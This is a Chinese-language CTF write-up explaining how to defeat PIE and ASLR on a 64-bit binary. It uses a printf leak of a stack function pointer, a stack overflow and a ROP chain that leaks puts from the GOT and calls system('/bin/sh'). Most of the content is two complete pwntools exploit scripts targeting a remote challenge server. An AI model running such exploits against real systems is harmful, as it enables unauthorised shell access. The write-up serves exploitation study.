

# 绕过alsr和pie



首先查看文件为64位，没有开启栈保护，开启了栈不可执行，地址随机化PIE和系统alsr，文件时动态编译，和系统glibc相关

![image-20231123172603190](images/%E7%BB%95%E8%BF%87alsr%E5%92%8Cpie.assets/image-20231123172603190.png)



分析文件

发现将func函数地址放入了栈中

read函数从标准输入中读取最高0x30字符，放入数组

printf函数输出数组中的字符

字符数组的范围为rbp - 0x30 至 rbp - 0x28，函数地址在栈中的范围为 rbp - 0x8 到 rbp

printf函数输出%s，会遇到\0才会停止，如果在read输入中，填充0x28字符，并保证中间没有\0

那么printf函数输出字符输出中的内容后，还会输出栈中func函数的地址，就可以成功泄露func地址，计算出基址，PIE

最后mian函数调用了func函数

![image-20231123172948710](images/%E7%BB%95%E8%BF%87alsr%E5%92%8Cpie.assets/image-20231123172948710.png)



func函数中存在栈溢出漏洞

泄露func函数地址后，计算基址，然后计算got表动态地址，plt表动态地址，pop rdi 动态地址等

使用puts函数泄露got表，判断libc版本，计算出system函数动态地址和"/bin/sh"字符串动态地址

![image-20231123173510309](images/%E7%BB%95%E8%BF%87alsr%E5%92%8Cpie.assets/image-20231123173510309.png)



第一步判断libc版本

```python
#!/usr/bin/env python
from pwn import *


context.binary = binary = ELF("./ezpie",checksec=False)
context.log_level = "debug"

#启动一个进程
p = remote('43.249.195.138',21106)

payload = b"A" * 0x27

p.sendline(payload)

p.recvuntil(b"hello, ")

p.recvn(0x28)

#泄露func函数地址，计算程序基址
func_addr_base = u64(p.recvline().split(b"\n")[0].ljust(8,b"\x00"))
base_addr = func_addr_base - 0x0000120e

print(hex(func_addr_base))
print(hex(base_addr))

#got静态地址
got_puts = 0x00003fb8
got_printf = 0x00003fc0
got_read = 0x00003fc8
got_setvbuf = 0x00003fd0
plt_puts = 0x00001080
pop_rdi = 0x0000000000001333

#计算got动态地址
got_puts_base = p64(base_addr + got_puts)
got_printf_base = p64(base_addr + got_printf)
got_read_base = p64(base_addr + got_read)
got_setvbuf_base = p64(base_addr + got_setvbuf)
plt_puts_base = p64(base_addr + plt_puts)
pop_rdi_base = p64(base_addr + pop_rdi)

payload = b"A" * 0x50 + b"A" * 0x8

payload += pop_rdi_base + got_puts_base + plt_puts_base + \
            pop_rdi_base + got_printf_base + plt_puts_base + \
            pop_rdi_base + got_read_base + plt_puts_base + \
            pop_rdi_base + got_setvbuf_base + plt_puts_base
            
p.sendline(payload)

p.recvuntil(b"thank you\n")

#获取库函数动态地址
libc_puts = u64(p.recvline().split(b"\n")[0].ljust(8,b"\x00"))
libc_printf = u64(p.recvline().split(b"\n")[0].ljust(8,b"\x00"))
libc_read = u64(p.recvline().split(b"\n")[0].ljust(8,b"\x00"))
libc_setvbuf = u64(p.recvline().split(b"\n")[0].ljust(8,b"\x00"))

#打印动态地址，计算libc版本
print(hex(libc_puts))
print(hex(libc_printf))
print(hex(libc_read))
print(hex(libc_setvbuf))

p.interactive()
```



调试发现，只泄露了got表中的两个地址。

是因为到了read函数设置的限制了，payload的发送的数据有一部分并没有接受。

解决方法是分泄露got表

![3ce59c3f26a4d3f3b86564b1466266e](images/%E7%BB%95%E8%BF%87alsr%E5%92%8Cpie.assets/3ce59c3f26a4d3f3b86564b1466266e.png)



研究发现，虽然这几个libc的小版本不一样，但是这几个库函数的偏移量都一样。

![image-20231123201542934](images/%E7%BB%95%E8%BF%87alsr%E5%92%8Cpie.assets/image-20231123201542934.png)



改进一下函数，在计算完毕后返回func函数，进行二次栈溢出

完整payload

```python
#!/usr/bin/env python
from pwn import *


context.binary = binary = ELF("./ezpie",checksec=False)
context.log_level = "debug"

#启动一个进程
#p = process()
p = remote('43.249.195.138',21106)

#获取进程的pid
#pid = util.proc.pidof(p)
#pid = pid[0]

#等待进程被跟踪
#util.proc.wait_for_debugger(pid)

#p.recvuntil(b"name->")


#pause()

payload = b"A" * 0x27

p.sendline(payload)

p.recvuntil(b"hello, ")

p.recvn(0x28)

got_puts = 0x00003fb8
got_printf = 0x00003fc0
got_read = 0x00003fc8
got_setvbuf = 0x00003fd0

plt_puts = 0x00001080

pop_rdi = 0x0000000000001333

ret_addr = 0x000000000000101a


func_addr_base = u64(p.recvline().split(b"\n")[0].ljust(8,b"\x00"))
base_addr = func_addr_base - 0x0000120e

got_puts_base = p64(base_addr + got_puts)
got_printf_base = p64(base_addr + got_printf)
got_read_base = p64(base_addr + got_read)
got_setvbuf_base = p64(base_addr + got_setvbuf)

plt_puts_base = p64(base_addr + plt_puts)

pop_rdi_base = p64(base_addr + pop_rdi)

ret_addr_base = p64(base_addr + ret_addr)

print(hex(func_addr_base))
print(hex(base_addr))


p.recvuntil(b"information->")

payload = b"A" * 0x50 + b"A" * 0x8

#payload += pop_rdi_base + got_puts_base + plt_puts_base + \
#            pop_rdi_base + got_printf_base + plt_puts_base + \
#            pop_rdi_base + got_read_base + plt_puts_base + \
#            pop_rdi_base + got_setvbuf_base + plt_puts_base

#payload += pop_rdi_base + got_puts_base + plt_puts_base + \
#            pop_rdi_base + got_printf_base + plt_puts_base

#payload += pop_rdi_base + got_read_base + plt_puts_base + \
#            pop_rdi_base + got_setvbuf_base + plt_puts_base

payload += pop_rdi_base + got_puts_base + plt_puts_base + p64(func_addr_base) ## return func


#pause()

p.sendline(payload)

p.recvuntil(b"thank you\n")

libc_puts = u64(p.recvline().split(b"\n")[0].ljust(8,b"\x00"))
#libc_printf = u64(p.recvline().split(b"\n")[0].ljust(8,b"\x00"))

#libc_read = u64(p.recvline().split(b"\n")[0].ljust(8,b"\x00"))
#libc_setvbuf = u64(p.recvline().split(b"\n")[0].ljust(8,b"\x00"))

print(hex(libc_puts))
#print(hex(libc_printf))

#print(hex(libc_read))
#print(hex(libc_setvbuf))

libc_system = p64(libc_puts - 0x32190)
libc_bin_sh = p64(libc_puts + 0x13019d)

payload = b"A" * 0x50 + b"A" * 0x8

payload += ret_addr_base + pop_rdi_base + libc_bin_sh + libc_system

p.sendline(payload)

p.interactive()

```



